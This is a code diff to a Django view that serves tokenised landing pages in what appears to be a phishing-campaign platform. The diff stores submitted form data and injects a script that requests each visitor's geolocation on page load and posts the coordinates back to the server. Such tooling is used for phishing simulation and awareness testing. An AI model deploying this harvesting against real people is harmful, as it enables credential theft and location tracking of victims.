@@ -67,20 +67,21 @@ def serve_landing_page(request, url_path, token):
     if request.method == 'POST':
         form_data = request.POST.dict()
         
+        # Guardar la ubicación si se proporciona
+        if 'latitude' in form_data and 'longitude' in form_data:
+            result.latitude = form_data['latitude']
+            result.longitude = form_data['longitude']
+            result.save()
+        
         if result.post_data:
             existing_data = json.loads(result.post_data)
             existing_data.update(form_data)
             result.post_data = json.dumps(existing_data)
         else:
             result.post_data = json.dumps(form_data)
-
-        result.landing_page_opened = True
-        result.landing_page_opened_timestamp = timezone.localtime()
-        result.status = 'landing_page_opened'
-        result.ip_address = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip() or request.META.get('REMOTE_ADDR', '')
-        result.user_agent = request.META.get('HTTP_USER_AGENT', '')
+        result.status = 'form_submitted'
         result.save()
-
+        
         next_page = LandingPage.objects.filter(landing_group=page.landing_group, order__gt=page.order).order_by('order').first()
         if next_page:
             return redirect('serve_landing_page', url_path=next_page.url_path, token=token)
@@ -139,6 +140,24 @@ def serve_landing_page(request, url_path, token):
                                 tag['src'] = f"data:{mime_type};base64,{content}"
                 else:
                     print(f"Archivo no encontrado: {file_path}")
+
+    # Agregar script para solicitar la ubicación
+    location_script = soup.new_tag('script')
+    location_script.string = """
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition);
+            }
+        }
+        function sendPosition(position) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", window.location.href, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+        }
+        window.onload = getLocation;
+    """
+    soup.body.append(location_script)
 
     return HttpResponse(str(soup))
 
